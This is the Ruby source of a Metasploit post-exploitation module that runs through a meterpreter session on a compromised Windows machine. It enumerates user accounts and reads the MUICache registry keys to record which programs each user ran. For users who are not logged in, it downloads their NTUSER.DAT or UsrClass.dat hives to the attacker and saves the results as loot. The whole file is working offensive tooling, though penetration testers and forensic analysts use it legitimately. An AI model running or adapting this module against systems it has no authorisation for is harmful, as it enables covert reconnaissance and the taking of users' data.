##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'
require 'rex/registry'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
      'Name'        =>'Windows Gather Enum User MUICache',
      'Description' =>
      %q{
        This module gathers information about the files and file paths that
        logged on users have executed on the system and it will also check
        if the file still exists on the system in the file path it has been
        previously executed. This information is gathered by using information
        stored under the MUICache registry key. If the user is logged in when the
        module is executed it will collect the MUICache entries by accessing
        the registry directly. If the user is not logged in the module will
        download users registry hive NTUSER.DAT/UsrClass.dat from the system
        and the MUICache contents are parsed from the downloaded hive.
        },
        'License'     =>  MSF_LICENSE,
        'Author'      =>  ['TJ Glad <tjglad[at]cmail.nu>'],
        'Platform'    =>  ['win'],
        'SessionType' =>  ['meterpreter']
        ))
  end

  def find_usernames()
    # This function scrapes usernames, sids and homepaths from the
    # registry so that we'll know what user accounts are on the system
    # and where we can find those users registry hives.
    usernames = Array.new
    user_homedir_paths = Array.new
    user_sids = Array.new

    username_reg_path = "HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList"
    profile_subkeys = registry_enumkeys(username_reg_path)
    if profile_subkeys.blank?
      print_error("Unable to access ProfileList registry key. Can't continue.")
      return nil
    else
      profile_subkeys.each do |user_sid|
        if user_sid.length > 10
          user_home_path = registry_getvaldata("#{username_reg_path}\\#{user_sid}", "ProfileImagePath")
          unless user_home_path.blank?
            full_path = user_home_path.strip
            usernames << full_path.split("\\").last
            user_homedir_paths << full_path
            user_sids << user_sid
          else
            print_error("Unable to read ProfileImagePath from the registry. Can't continue.")
            return nil
          end
        end
      end
    end
    return usernames, user_homedir_paths, user_sids
  end

  def enum_muicache_paths(sys_sids, mui_path)
    # This function builds full registry muicache paths so that we can
    # later enumerate the muicahe registry key contents.
    user_mui_paths = Array.new
    hive = "HKU\\"
    sys_sids.each do |sid|
      full_path = hive + sid + mui_path
      user_mui_paths << full_path
    end
    return user_mui_paths
  end

  def enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file, table)
    # This is the main enumeration function that calls other main
    # functions depending if we can access the registry directly or if
    # we need to download the hive and process it locally.
    loot_path = Msf::Config::loot_directory
    all_user_entries = sys_users.zip(muicache_reg_keys, sys_paths)
    all_user_entries.each do |user, reg_key, sys_path|
      local_hive_copy = ::File.join(loot_path, "#{sysinfo['Computer']}_#{user}_HIVE_#{::Time.now.utc.strftime('%Y%m%d.%M%S')}")
      subkeys = registry_enumvals(reg_key)
      unless subkeys.blank?
        # If the registry_enumvals returns us content we'll know that we
        # can access the registry directly and thus continue to process
        # the content collected from there.
        print_status("User #{user}: Enumerating registry..")
        subkeys.each do |key|
          if key[0] != "@" and key != "LangID" and not key.nil?
            check_file_exists(key, user, table)
          end
        end
      else
        # If the registry_enumvals returns us nothing then we'll know
        # that the user is most likely not logged in and we'll need to
        # download and process users hive locally.
        print_error("User #{user}: Can't access registry (maybe the user is not logged in atm?). Trying NTUSER.DAT/USRCLASS.DAT..")
        process_hive(sys_path, user, local_hive_copy, table, muicache, hive_file)
      end
    end
    return table
  end

  def check_file_exists(key, user, table)
    # This function will check if it can find the program executable
    # from the path it found from the registry. Permissions might affect
    # if it detects the executable but it should be otherwise fairly
    # reliable.
    program_path = expand_path(key)
    program_exists = file_exist?(key)
    if program_exists == true
      exists = "File found"
    else
      exists = "File not found"
    end
    table << [user, program_path, exists]
  end

  def process_hive(sys_path, user, local_hive_copy, table, muicache, hive_file)
    # This function will check if the filepath contains a registry hive
    # and if it does it'll proceed to call the function responsible of
    # downloading the hive. After successfull download it'll continue to
    # call the hive_parser function which will extract the contents of
    # the MUICache registry key.
    user_home_path = expand_path(sys_path)
    hive_path = user_home_path + hive_file
    ntuser_status = client.fs.file.exists?(hive_path)
    if ntuser_status == true
      print_status("Downloading #{user}'s NTUSER.DAT/USRCLASS.DAT file..")
      hive_status = hive_download_status(local_hive_copy, hive_path)
      if hive_status == true
        hive_parser(local_hive_copy, muicache, user, table)
      else
        print_error("All registry hive download attempts failed. Unable to continue.")
        return nil
      end
    else
      print_error("Couldn't locate/download #{user}'s registry hive. Can't proceed.")
      return nil
    end
  end

  def hive_download_status(local_hive_copy, hive_path)
    # This function downloads registry hives and checks for integrity
    # after the transfer has completed so that we don't end up
    # processing broken registry hive.
    hive_status = false
    3.times do
      remote_hive_hash_raw = client.fs.file.md5(hive_path)
      unless remote_hive_hash_raw.blank?
        remote_hive_hash = remote_hive_hash_raw.unpack('H*')
        session.fs.file.download_file(local_hive_copy, hive_path)
        local_hive_hash = file_local_digestmd5(local_hive_copy)
        if local_hive_hash == remote_hive_hash[0]
          print_good("Hive downloaded successfully.")
          hive_status = true
          break
        else
          print_error("Hive download corrupted, trying again (max 3 times)..")
          File.delete(local_hive_copy) # Downloaded corrupt hive gets deleted before new attempt is made
          hive_status = false
        end
      end
    end
    return hive_status
  end

  def hive_parser(local_hive_copy, muicache, user, table)
    # This function is responsible for parsing the downloaded hive and
    # extracting the contents of the MUICache registry key.
    print_status("Phase 3: Parsing registry content..")
    err_msg = "Error parsing hive. Can't continue."
    hive = Rex::Registry::Hive.new(local_hive_copy)
    if hive.nil?
      print_error(err_msg)
      return nil
    else
      muicache_key = hive.relative_query(muicache)
      if muicache_key.nil?
        print_error(err_msg)
        return nil
      else
        muicache_key_value_list = muicache_key.value_list
        if muicache_key_value_list.nil?
          print_error(err_msg)
          return nil
        else
          muicache_key_values = muicache_key_value_list.values
          if muicache_key_values.nil?
            print_error(err_msg)
            return nil
          else
            muicache_key_values.each do |value|
              key = value.name
              if key[0] != "@" and key != "LangID" and not key.nil?
                check_file_exists(key, user, table)
              end
            end
          end
        end
      end
    end
    File.delete(local_hive_copy) # Downloaded hive gets deleted after processing
    return table
  end

  def print_usernames(sys_users)
    # This prints usernames pulled from the paths found from the
    # registry.
    user_list = Array.new
    sys_users.each do |user|
      user_list << user
    end
    users = user_list.join(", ")
    print_good("Found users: #{users}")
  end

  def run

    # Information about the MUICache registry key was collected from:
    #
    # - Windows Forensic Analysis Toolkit / 2012 / Harlan Carvey
    # - Windows Registry Forensics / 2011 / Harlan Carvey
    # - http://forensicartifacts.com/2010/08/registry-muicache/
    # - http://www.irongeek.com/i.php?page=security/windows-forensics-registry-and-file-system-spots

    print_status("Starting to enumerate MuiCache registry keys..")
    sysnfo = sysinfo['OS']

    if sysnfo =~/(Windows XP)/ and is_admin?
      print_good("Remote system supported: #{sysnfo}")
      muicache = "\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"
      hive_file = "\\NTUSER.DAT"
    elsif sysnfo =~/(Windows 7)/ and is_admin?
      print_good("Remote system supported: #{sysnfo}")
      muicache = "_Classes\\Local\ Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache"
      hive_file = "\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat"
    else
      print_error("Unsupported OS or not enough privileges. Unable to continue.")
      return nil
    end

    table = Rex::Ui::Text::Table.new(
      'Header'  =>  'MUICache Information',
      'Indent'  =>  1,
      'Columns' =>
      [
        "Username",
        "File path",
        "File status",
      ])

    print_status("Phase 1: Searching usernames..")
    sys_users, sys_paths, sys_sids = find_usernames()
    unless sys_users.blank?
      print_usernames(sys_users)
    else
      print_error("Was not able to find any user accounts. Unable to continue.")
      return nil
    end

    print_status("Phase 2: Searching registry hives..")
    muicache_reg_keys = enum_muicache_paths(sys_sids, muicache)
    results = enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file, table).to_s

    print_status("Phase 4: Processing results..")
    loot = store_loot("muicache_info", "text/plain", session, results, nil, "MUICache Information")
    print_line("\n" + results + "\n")
    print_status("Results stored in: #{loot}")
    print_status("Execution finished.")
  end
end
